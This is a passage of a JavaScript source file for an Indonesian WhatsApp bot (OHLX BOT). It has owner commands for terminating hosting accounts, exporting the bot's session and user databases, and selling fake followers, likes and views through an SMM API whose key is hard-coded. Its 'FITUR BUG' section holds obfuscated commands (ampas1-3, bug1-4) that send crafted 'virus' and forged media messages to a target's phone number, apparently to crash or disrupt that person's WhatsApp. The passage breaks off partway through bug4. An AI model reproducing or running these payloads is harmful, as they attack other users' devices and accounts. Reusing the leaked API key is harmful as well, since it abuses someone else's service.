reply('Wait Terminating Account....')
axios
.get(
`https://${hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`, authWhm )
.then((e) => {
if ([1, "1"].includes(e.data?.metadata?.result))
reply(`Done User ${q} Telah di Terminate`);
else {
reply(e.metadata);
console.log(e.data);
}
})
break
case 'mysesi': case 'sendsesi': case 'session':{
if (!isOwner) return reply(mess.OnlyOwner)
reply('please wait..')
await sleep(3000)

// Read Database
var user_bot = await fs.readFileSync('./database/pengguna.json')
var saldo_us = await fs.readFileSync('./database/saldoUser.json')
var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)

// Sending Document
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:msg})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:msg})
conn.sendMessage(from, { document: saldo_us, mimetype: 'document/application', fileName: 'saldoUser.json'}, {quoted:msg})
}
break
// CASE BY OHLX BOT
// JANGAN DI EDIT LAGI YA
case 'pricelist': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`)
if (feta.status == false) return reply(feta.data.msg)
let list = '*List Harga Layanan*\n\n'
for (let L of feta.data) {
list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
}
conn.sendMessage(from, {text: list}, {quoted:msg})
}
break
case 'komisi':
if (!isOwner) return reply(mess.OnlyOwner)
var komisi = await fetchJson(`http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop`)
let reskomisi = `Hallo owner Berikut komisi anda\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`
conn.sendMessage(from, {text: reskomisi }, {quoted:msg})
break
case 'tk': case 'tarikkomisi': {
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 1) return reply('jumlahnya berapa? minimal 10k')
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=listwallet`)
let list = []
console.log(fetaa)
for (let L of fetaa.data) {
let no = 1
list.push({
buttonText: {displayText: L.wallet},
buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
type: `${no++}`
})}
let nyobb = list
conn.sendMessage(from, {text:`*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`, title: 'WALLET', footer: '©SosmedShop', buttons: nyobb})
}
break
case 'tarikkomisikunci':
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 1) return m.reply('jumlahnya berapa bang')
let juml = q.split('|')[0] ? q.split('|')[0]: q
let walle = q.split('|')[1] ? q.split('|')[1]: ''
if (walle.length < 1) return reply(`Jumlah dan Target harus di isi!`)
var tarikom = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm_dana_number}&an=${smm_dana_nama}`)
console.log(tarikom)
conn.sendMessage(from, {text: `${tarikom.data.msg}`}, {quoted:msg})
break
case 'clear':
case 'clearer':
case 'clearerr':{
if (!isOwner) return reply(mess.OnlyOwner)
server_eror.splice('[]')
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
reply('Done')
}
break
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
var teks =`*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
var NO = 1
for (let i of server_eror){
teks +=`=> *ERROR (${NO++})*\n${i.error}\n\n`
}
reply(teks)
}
break
case 'order':
case 'caraorder': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let capp = `*Hallo Kak Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|ohlx4554_\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
conn.sendMessage(from, {text: capp}, {quoted:msg})
}
break
case 'view': case 'like': case 'follower': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply('Format tidak valid, jika masih belum mengerti ketik *#order*')
let juma = q.split('|')[0] ? q.split('|')[0]: q
let targtt = q.split('|')[1] ? q.split('|')[1]: ''
if (targtt.length < 1) return reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|ohlx456_`)
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`)
let list = []
var textplus = `${juma}|${targtt}`
for (let L of fetaa.data) {
list.push({
title: `${L.nama}`,
rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
description: `\n${L.desc}`
})
}
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: '© created by OHLX BOT',
  buttonText: "Click Here!",
  sections: [{
title: "Sosmed Shop",
  rows: list
}],
listType: 1
}
const sendMsg = await conn.sendMessage(from, listMessage)
break
}
case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|ohlx_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
let jumlah = q.split('|')[0] ? q.split('|')[0]: q
let targ = q.split('|')[1] ? q.split('|')[1]: ''
let idny = q.split('|')[2] ? q.split('|')[2]: ''
var feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
if (feta.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
let idpes = feta.data.order_id
let cap = `Hai *@${sender.split('@')[0]} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! Menggunakan QRIS.\n\n*ID Pesanan :*\n${feta.data.order_id}\n\n*Target :*\n${targ}\n\n*Jumlah Order :* ${jumlah}\n*Total Harga :* Rp${toRupiah(feta.data.amount)}\n*Status Orderan :* ${feta.data.status}\n\n*info lebih lanjut?*\n*klik button dibawah.*`
var buto = [{buttonId: `!cekstatus ${feta.data.order_id}`, buttonText: { displayText: 'Check Status' }, type: 1 }]
conn.sendMessage(from, { caption: cap, image: { url: feta.data.qris }, buttons: buto, footer: '© created by OHLX BOT' })
}
console.log(feta)
}
break
case 'chekstatus':
case 'cekstatus': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!q) return reply('id ordernya mana kak?')
var seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`)
if (seta.status == false) {
var captionnye = `\nid order tidak di temukan`
} else {
var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli jasa suntik dari kami, ditunggu next ordernya!`
}
reply(captionnye)
break
}

// FITUR BUG BY OHLX BOT
// JANGAN DI SALAH GUNAKAN
// NIH FITUR HANYA UNTUK HIBURAN

case 'ampas1':{
var _0x168e29=_0x3fd1;(function(_0x25d94a,_0x1302fc){var _0x381f10=_0x3fd1,_0x10bba9=_0x25d94a();while(!![]){try{var _0xad7aa4=-parseInt(_0x381f10(0x7b))/0x1+parseInt(_0x381f10(0x6d))/0x2+-parseInt(_0x381f10(0x75))/0x3*(-parseInt(_0x381f10(0x71))/0x4)+-parseInt(_0x381f10(0x78))/0x5+parseInt(_0x381f10(0x7d))/0x6+-parseInt(_0x381f10(0x73))/0x7+parseInt(_0x381f10(0x7a))/0x8;if(_0xad7aa4===_0x1302fc)break;else _0x10bba9['push'](_0x10bba9['shift']());}catch(_0x417033){_0x10bba9['push'](_0x10bba9['shift']());}}}(_0x2b24,0xec41e));if(!isOwner)return reply(mess[_0x168e29(0x76)]);if(!q)return reply('*Syntax\x20Error!*\x0aEx:\x20#'+command+_0x168e29(0x70));var num=q+_0x168e29(0x7c),dev=_0x168e29(0x7f);if(num==sender)return reply(_0x168e29(0x7e));if(num==dev)return reply('Lah\x20itu\x20kan\x20developer\x20botnya?');function _0x2b24(){var _0x19e2ac=['1607400kgVqcm','LX1','length','\x20628xxxx','7181420wwqiZl','Nomor\x20+','8118628tiIgVK','onWhatsApp','3OjorOV','OnlyOwner','Waiting...','5471285CGvCPQ','\x0atidak\x20terdaftar\x20di\x20WhatsApp','4279000flRcrO','993788BGDnNW','@s.whatsapp.net','6489774sjvVvc','Itu\x20Nomor\x20Lu\x20Sendiri','6285943429237@s.whatsapp.net'];_0x2b24=function(){return _0x19e2ac;};return _0x2b24();}function _0x3fd1(_0x12c2cd,_0x35f324){var _0x2b24c6=_0x2b24();return _0x3fd1=function(_0x3fd12c,_0xaddaa1){_0x3fd12c=_0x3fd12c-0x6d;var _0xda4e95=_0x2b24c6[_0x3fd12c];return _0xda4e95;},_0x3fd1(_0x12c2cd,_0x35f324);}var cekap=await conn[_0x168e29(0x74)](num);if(cekap[_0x168e29(0x6f)]==0x0)return reply(_0x168e29(0x72)+num+_0x168e29(0x79));reply(_0x168e29(0x77)),conn['sendMessage'](num,{'text':_0x168e29(0x6e)},{'quoted':virus_nya}),await sleep(0xbb8),reply('_*Sukses\x20mengirim\x20bugAmpas1*_\x0a*ID:*\x20Wa.me/'+num['split']('@')[0x0]);
}
break
case 'ampas2':{
var _0x52e36e=_0x36f0;(function(_0x1e3a0c,_0x5e1806){var _0x44ceac=_0x36f0,_0x4dd89f=_0x1e3a0c();while(!![]){try{var _0x54005f=parseInt(_0x44ceac(0x8e))/0x1+parseInt(_0x44ceac(0x9c))/0x2+-parseInt(_0x44ceac(0x95))/0x3+-parseInt(_0x44ceac(0x97))/0x4*(-parseInt(_0x44ceac(0x8d))/0x5)+-parseInt(_0x44ceac(0x93))/0x6+-parseInt(_0x44ceac(0xa2))/0x7*(-parseInt(_0x44ceac(0x90))/0x8)+-parseInt(_0x44ceac(0x98))/0x9*(parseInt(_0x44ceac(0x92))/0xa);if(_0x54005f===_0x5e1806)break;else _0x4dd89f['push'](_0x4dd89f['shift']());}catch(_0x17f243){_0x4dd89f['push'](_0x4dd89f['shift']());}}}(_0x36f9,0xd8eb4));function _0x36f9(){var _0x1af9d1=['split','_*Sukses\x20mengirim\x20bugAmpas2*_\x0a*ID:*\x20Wa.me/','3498718vZNFnB','Waiting...','\x20628xxxx','onWhatsApp','Lah\x20itu\x20kan\x20developer\x20botnya?','sendMessage','1000419rVKHcv','Nomor\x20+','LX2','5bFYZkt','130024SejEHP','6285943429237@s.whatsapp.net','72OTQzEc','Itu\x20Nomor\x20Lu\x20Sendiri','690UDibaz','3085074VITLop','*Syntax\x20Error!*\x0aEx:\x20#','3444042PEGTMd','length','6309852vtoLEx','285966MbSEpt','OnlyOwner'];_0x36f9=function(){return _0x1af9d1;};return _0x36f9();}if(!isOwner)return reply(mess[_0x52e36e(0x99)]);if(!q)return reply(_0x52e36e(0x94)+command+_0x52e36e(0x9e));var num=q+'@s.whatsapp.net',dev=_0x52e36e(0x8f);if(num==sender)return reply(_0x52e36e(0x91));if(num==dev)return reply(_0x52e36e(0xa0));var cekap=await conn[_0x52e36e(0x9f)](num);function _0x36f0(_0x19e1a0,_0x3ec3a2){var _0x36f956=_0x36f9();return _0x36f0=function(_0x36f06b,_0x4c542e){_0x36f06b=_0x36f06b-0x8c;var _0x427ff6=_0x36f956[_0x36f06b];return _0x427ff6;},_0x36f0(_0x19e1a0,_0x3ec3a2);}if(cekap[_0x52e36e(0x96)]==0x0)return reply(_0x52e36e(0xa3)+num+'\x0atidak\x20terdaftar\x20di\x20WhatsApp');reply(_0x52e36e(0x9d)),conn[_0x52e36e(0xa1)](num,{'text':_0x52e36e(0x8c)},{'quoted':virus_nya}),await sleep(0x7d0),conn[_0x52e36e(0xa1)](num,{'text':'LX2'},{'quoted':virus_nya}),await sleep(0xbb8),reply(_0x52e36e(0x9b)+num[_0x52e36e(0x9a)]('@')[0x0]);
}
break
case 'ampas3':{
var _0x2f0c7c=_0x3dcd;(function(_0x4f320b,_0x12a7c8){var _0x37fcf9=_0x3dcd,_0x458a2d=_0x4f320b();while(!![]){try{var _0xe7fc32=parseInt(_0x37fcf9(0x16e))/0x1+parseInt(_0x37fcf9(0x168))/0x2*(-parseInt(_0x37fcf9(0x164))/0x3)+-parseInt(_0x37fcf9(0x160))/0x4*(-parseInt(_0x37fcf9(0x163))/0x5)+-parseInt(_0x37fcf9(0x15b))/0x6*(-parseInt(_0x37fcf9(0x16a))/0x7)+parseInt(_0x37fcf9(0x159))/0x8+-parseInt(_0x37fcf9(0x15d))/0x9+-parseInt(_0x37fcf9(0x15f))/0xa;if(_0xe7fc32===_0x12a7c8)break;else _0x458a2d['push'](_0x458a2d['shift']());}catch(_0x451bc9){_0x458a2d['push'](_0x458a2d['shift']());}}}(_0x26c1,0x30579));if(!isOwner)return reply(mess[_0x2f0c7c(0x161)]);if(!q)return reply(_0x2f0c7c(0x167)+command+_0x2f0c7c(0x15a));var num=q+_0x2f0c7c(0x16b),dev=_0x2f0c7c(0x158);if(num==sender)return reply('Itu\x20Nomor\x20Lu\x20Sendiri');if(num==dev)return reply(_0x2f0c7c(0x15c));var cekap=await conn[_0x2f0c7c(0x162)](num);function _0x26c1(){var _0x4201b9=['\x20628xxxx','5022QznHfy','Lah\x20itu\x20kan\x20developer\x20botnya?','815229QqgeyS','_*Sukses\x20mengirim\x20bugAmpas3*_\x0a*ID:*\x20Wa.me/','2469100KtdGXN','432504AMPnjg','OnlyOwner','onWhatsApp','5NhfreD','20283ZbpziF','Waiting...','Nomor\x20+','*Syntax\x20Error!*\x0aEx:\x20#','10obtneA','split','21AEIkvp','@s.whatsapp.net','LX3','sendMessage','122503hZrElz','\x0atidak\x20terdaftar\x20di\x20WhatsApp','6285943429237@s.whatsapp.net','2689320PxyjIY'];_0x26c1=function(){return _0x4201b9;};return _0x26c1();}if(cekap['length']==0x0)return reply(_0x2f0c7c(0x166)+num+_0x2f0c7c(0x16f));function _0x3dcd(_0x1c21f4,_0x147045){var _0x26c165=_0x26c1();return _0x3dcd=function(_0x3dcdfd,_0x1be3e6){_0x3dcdfd=_0x3dcdfd-0x158;var _0x1925b8=_0x26c165[_0x3dcdfd];return _0x1925b8;},_0x3dcd(_0x1c21f4,_0x147045);}reply(_0x2f0c7c(0x165)),conn[_0x2f0c7c(0x16d)](num,{'text':_0x2f0c7c(0x16c)},{'quoted':virus_nya}),await sleep(0x7d0),conn[_0x2f0c7c(0x16d)](num,{'text':'LX3'},{'quoted':virus_nya}),await sleep(0x7d0),conn[_0x2f0c7c(0x16d)](num,{'text':_0x2f0c7c(0x16c)},{'quoted':virus_nya}),await sleep(0xbb8),reply(_0x2f0c7c(0x15e)+num[_0x2f0c7c(0x169)]('@')[0x0]);
}
break
case 'bug1':{
var _0x40e6e7=_0x4866;(function(_0x128a98,_0x3c4269){var _0x21d442=_0x4866,_0x190928=_0x128a98();while(!![]){try{var _0x4d3e8d=parseInt(_0x21d442(0x131))/0x1+-parseInt(_0x21d442(0x13b))/0x2+parseInt(_0x21d442(0x12e))/0x3+-parseInt(_0x21d442(0x145))/0x4*(-parseInt(_0x21d442(0x136))/0x5)+parseInt(_0x21d442(0x139))/0x6*(parseInt(_0x21d442(0x148))/0x7)+-parseInt(_0x21d442(0x130))/0x8*(parseInt(_0x21d442(0x13e))/0x9)+-parseInt(_0x21d442(0x141))/0xa*(parseInt(_0x21d442(0x143))/0xb);if(_0x4d3e8d===_0x3c4269)break;else _0x190928['push'](_0x190928['shift']());}catch(_0xf08895){_0x190928['push'](_0x190928['shift']());}}}(_0x9bb3,0xea110));if(!isOwner)return reply(mess[_0x40e6e7(0x12f)]);if(!q)return reply(_0x40e6e7(0x13c)+command+_0x40e6e7(0x144));var num=q+_0x40e6e7(0x12c),dev='6285943429237@s.whatsapp.net';function _0x4866(_0x38b973,_0x53381b){var _0x9bb350=_0x9bb3();return _0x4866=function(_0x4866bb,_0x160c2b){_0x4866bb=_0x4866bb-0x12b;var _0x5241d5=_0x9bb350[_0x4866bb];return _0x5241d5;},_0x4866(_0x38b973,_0x53381b);}if(num==sender)return reply(_0x40e6e7(0x149));if(num==dev)return reply(_0x40e6e7(0x135));var cekap=await conn[_0x40e6e7(0x140)](num);if(cekap[_0x40e6e7(0x132)]==0x0)return reply(_0x40e6e7(0x138)+num+'\x0atidak\x20terdaftar\x20di\x20WhatsApp');function _0x9bb3(){var _0x5ba3ef=['Lah\x20itu\x20kan\x20developer\x20botnya?','5haHqCY','split','Nomor\x20+','51234rLcznx','key','2361536JtrbbX','*Syntax\x20Error!*\x0aEx:\x20#','\x0a*Type:*\x20audio.message','786033YnMzpm','258330','onWhatsApp','14433980XqIdqJ','1657190832','11vDFkkM','\x20628xxxx','1653068nZBMdB','audio/mpeg','fromObject','1169AFjZMx','Itu\x20Nomor\x20Lu\x20Sendiri','gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=','@s.whatsapp.net','jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=','2981250VMUYMC','OnlyOwner','16kfdNRb','924546uFnJUC','length','Message','*Sukses\x20Mengirim\x20Bug1*\x0a*ID:*\x20Wa.me/'];_0x9bb3=function(){return _0x5ba3ef;};return _0x9bb3();}var audio=generateWAMessageFromContent(num,proto[_0x40e6e7(0x133)][_0x40e6e7(0x147)]({'audioMessage':{'url':'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc','mimetype':_0x40e6e7(0x146),'fileSha256':_0x40e6e7(0x12d),'fileLength':_0x40e6e7(0x13f),'seconds':0x10,'ptt':![],'mediaKey':_0x40e6e7(0x12b),'fileEncSha256':'6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','directPath':'/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118','mediaKeyTimestamp':_0x40e6e7(0x142)}}),{'userJid':num,'quoted':virus_nya});reply(_0x40e6e7(0x134)+num[_0x40e6e7(0x137)]('@')[0x0]+_0x40e6e7(0x13d)),conn['relayMessage'](num,audio['message'],{'messageId':audio[_0x40e6e7(0x13a)]['id']});
}
break
case 'bug2':{
var _0x5b063e=_0x2810;(function(_0x4d3a96,_0x29b4dc){var _0x2e0154=_0x2810,_0x2dba9b=_0x4d3a96();while(!![]){try{var _0x30c017=parseInt(_0x2e0154(0xc8))/0x1+parseInt(_0x2e0154(0xca))/0x2*(parseInt(_0x2e0154(0xb6))/0x3)+parseInt(_0x2e0154(0xc7))/0x4*(-parseInt(_0x2e0154(0xb7))/0x5)+-parseInt(_0x2e0154(0xbf))/0x6+parseInt(_0x2e0154(0xbc))/0x7*(parseInt(_0x2e0154(0xba))/0x8)+-parseInt(_0x2e0154(0xc1))/0x9+parseInt(_0x2e0154(0xbe))/0xa;if(_0x30c017===_0x29b4dc)break;else _0x2dba9b['push'](_0x2dba9b['shift']());}catch(_0x2cb0b9){_0x2dba9b['push'](_0x2dba9b['shift']());}}}(_0x30f6,0x967fd));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x5b063e(0xd2)+command+_0x5b063e(0xc2));var num=q+_0x5b063e(0xd0),dev=_0x5b063e(0xd5);if(num==sender)return reply(_0x5b063e(0xd1));if(num==dev)return reply(_0x5b063e(0xb4));function _0x30f6(){var _0x572faa=['\x0atidak\x20terdaftar\x20di\x20WhatsApp','6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=','@s.whatsapp.net','Itu\x20Nomor\x20Lu\x20Sendiri','*Syntax\x20Error!*\x0aEx:\x20#','fromObject','42521','6285943429237@s.whatsapp.net','relayMessage','Lah\x20itu\x20kan\x20developer\x20botnya?','onWhatsApp','29256syTfiS','5469655ZBePqG','1657286523','length','4197904CnsSwb','\x0a*Type:*\x20image.message','7kTVsWH','readFileSync','22086770LPKkFm','7373994ZQbDNh','imageMessage','2385801cKAZNO','\x20628xxxx','Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=','waUploadToServer','split','*Sukses\x20Mengirim\x20Bug2*\x0a*ID:*\x20Wa.me/','4bKALSg','90721pmfKMp','Nomor\x20+','78wEwxqC','imgPath','/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1','https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc'];_0x30f6=function(){return _0x572faa;};return _0x30f6();}var cekap=await conn[_0x5b063e(0xb5)](num);if(cekap[_0x5b063e(0xb9)]==0x0)return reply(_0x5b063e(0xc9)+num+_0x5b063e(0xce));function _0x2810(_0x27abf6,_0x1c98e7){var _0x30f6e8=_0x30f6();return _0x2810=function(_0x281050,_0x17e4ef){_0x281050=_0x281050-0xb3;var _0x3f4dee=_0x30f6e8[_0x281050];return _0x3f4dee;},_0x2810(_0x27abf6,_0x1c98e7);}var messa=await prepareWAMessageMedia({'image':fs[_0x5b063e(0xbd)](setting[_0x5b063e(0xcb)])},{'upload':conn[_0x5b063e(0xc4)]}),image=generateWAMessageFromContent(num,proto['Message'][_0x5b063e(0xd3)]({'imageMessage':{'url':_0x5b063e(0xcd),'mimetype':'image/jpeg','caption':'©\x20OHLXbot•MD'+ngazap(prefix),'fileSha256':'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=','fileLength':_0x5b063e(0xd4),'height':0x1aa,'width':0x280,'mediaKey':_0x5b063e(0xcf),'fileEncSha256':_0x5b063e(0xc3),'directPath':_0x5b063e(0xcc),'mediaKeyTimestamp':_0x5b063e(0xb8),'jpegThumbnail':messa[_0x5b063e(0xc0)]}}),{'userJid':num,'quoted':virus_nya});reply(_0x5b063e(0xc6)+num[_0x5b063e(0xc5)]('@')[0x0]+_0x5b063e(0xbb)),conn[_0x5b063e(0xb3)](num,image['message'],{'messageId':image['key']['id']});
}
break
case 'bug3':{
function _0x259e(_0x1d8af9,_0x41d64c){var _0x13800e=_0x1380();return _0x259e=function(_0x259e55,_0x477e08){_0x259e55=_0x259e55-0x8b;var _0x395a69=_0x13800e[_0x259e55];return _0x395a69;},_0x259e(_0x1d8af9,_0x41d64c);}var _0x1dbc03=_0x259e;(function(_0x4fa2db,_0xd52ccb){var _0x221843=_0x259e,_0xa8675=_0x4fa2db();while(!![]){try{var _0x1d5245=-parseInt(_0x221843(0x8b))/0x1*(-parseInt(_0x221843(0x99))/0x2)+parseInt(_0x221843(0x9c))/0x3+parseInt(_0x221843(0xa3))/0x4+-parseInt(_0x221843(0xa8))/0x5+-parseInt(_0x221843(0xa6))/0x6+parseInt(_0x221843(0x8f))/0x7+-parseInt(_0x221843(0x8d))/0x8*(parseInt(_0x221843(0x92))/0x9);if(_0x1d5245===_0xd52ccb)break;else _0xa8675['push'](_0xa8675['shift']());}catch(_0x5424b2){_0xa8675['push'](_0xa8675['shift']());}}}(_0x1380,0x9ee48));if(!isOwner)return reply(mess[_0x1dbc03(0xa1)]);if(!q)return reply(_0x1dbc03(0x9b)+command+_0x1dbc03(0x8c));var num=q+_0x1dbc03(0x90),dev=_0x1dbc03(0x91);if(num==sender)return reply(_0x1dbc03(0x9f));if(num==dev)return reply(_0x1dbc03(0x93));var cekap=await conn['onWhatsApp'](num);if(cekap[_0x1dbc03(0x9e)]==0x0)return reply('Nomor\x20+'+num+'\x0atidak\x20terdaftar\x20di\x20WhatsApp');var messa=await prepareWAMessageMedia({'image':fs[_0x1dbc03(0x96)](setting[_0x1dbc03(0xa5)])},{'upload':conn[_0x1dbc03(0x98)]}),document=generateWAMessageFromContent(num,proto[_0x1dbc03(0xa0)][_0x1dbc03(0x97)]({'documentMessage':{'url':_0x1dbc03(0x9a),'mimetype':_0x1dbc03(0xa4),'title':_0x1dbc03(0x8e),'fileSha256':_0x1dbc03(0x94),'pageCount':0x0,'mediaKey':_0x1dbc03(0x95),'fileName':_0x1dbc03(0xa7)+ngazap(prefix),'fileEncSha256':'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=','directPath':'/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5','mediaKeyTimestamp':'1657288637'}}),{'userJid':num,'quoted':virus_nya});function _0x1380(){var _0x323b89=['EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=','readFileSync','fromObject','waUploadToServer','4958tpoFvH','https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc','*Syntax\x20Error!*\x0aEx:\x20#','2496435Yfhkrl','split','length','Itu\x20Nomor\x20Lu\x20Sendiri','Message','OnlyOwner','\x0a*Type:*\x20document.message','4620224tPzohi','application/octet-stream','imgPath','6137106Itcvry','©\x20OHLXbot•MD','4835510ytclFq','message','331ZQWfyf','\x20628xxxx','48RUEeSO','.dev','6044983ApWYqt','@s.whatsapp.net','6285943429237@s.whatsapp.net','1545813tXjltl','Lah\x20itu\x20kan\x20developer\x20botnya?','47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU='];_0x1380=function(){return _0x323b89;};return _0x1380();}reply('*Sukses\x20Mengirim\x20Bug3*\x0a*ID:*\x20Wa.me/'+num[_0x1dbc03(0x9d)]('@')[0x0]+_0x1dbc03(0xa2)),conn['relayMessage'](num,document[_0x1dbc03(0xa9)],{'messageId':document['key']['id']});
}
break
case 'bug4':{
var _0x517aa3=_0xabfe;(function(_0x309cc0,_0x56df0f){var _0x4d71d2=_0xabfe,_0x3be067=_0x309cc0();while(!![]){try{var _0xb684b1=parseInt(_0x4d71d2(0x201))/0x1+parseInt(_0x4d71d2(0x1f1))/0x2+parseInt(_0x4d71d2(0x1fe))/0x3*(-parseInt(_0x4d71d2(0x1f4))/0x4)+parseInt(_0x4d71d2(0x205))/0x5+-parseInt(_0x4d71d2(0x1fa))/0x6+-parseInt(_0x4d71d2(0x203))/0x7+parseInt(_0x4d71d2(0x208))/0x8;if(_0xb684b1===_0x56df0f)break;else _0x3be067['push'](_0x3be067['shift']());}catch(_0x1a2b0a){_0x3be067['push'](_0x3be067['shift']());}}}(_0x5e01,0x89037));function _0x5e01(){var _0xb5c30c=['https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\x0a\x0a©\x20OHLXbot•MD','1113986qaXlCp','*Syntax\x20Error!*\x0aEx:\x20#','6390706AlwlfM','Lah\x20itu\x20kan\x20developer\x20botnya?','2595290FZRfTy','Message','©\x20OHLXbot•MD','1974104sbCXoQ','\x0a*Type:*\x20extended.message','message','*Sukses\x20Mengirim\x20Bug4*\x0a*ID:*\x20Wa.me/','onWhatsApp','1372306NFdkPx','OnlyOwner','NONE','4qAvkxP','Undangan\x20Grup\x20WhatsApp','split','relayMessage','Itu\x20Nomor\x20Lu\x20Sendiri','https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K','3374664KPIRDl','\x0atidak\x20terdaftar\x20di\x20WhatsApp','Nomor\x20+','6285943429237@s.whatsapp.net','1588053JEcAMn','length'];_0x5e01=function(){return _0xb5c30c;};return _0x5e01();}if(!isOwner)return reply(mess[_0x517aa3(0x1f2)]);if(!q)return reply(_0x517aa3(0x202)+command+'\x20628xxxx');var num=q+'@s.whatsapp.net',dev=_0x517aa3(0x1fd);if(num==sender)return reply(_0x517aa3(0x1f8));if(num==dev)return reply(_0x517aa3(0x204));function _0xabfe(_0x1ef22b,_0x1735aa){var _0x5e015f=_0x5e01();return _0xabfe=function(_0xabfed4,_0x374c84){_0xabfed4=_0xabfed4-0x1f1;var _0xd938d4=_0x5e015f[_0xabfed4];return _0xd938d4;},_0xabfe(_0x1ef22b,_0x1735aa);}var cekap=await conn[_0x517aa3(0x20c)](num);if(cekap[_0x517aa3(0x1ff)]==0x0)return 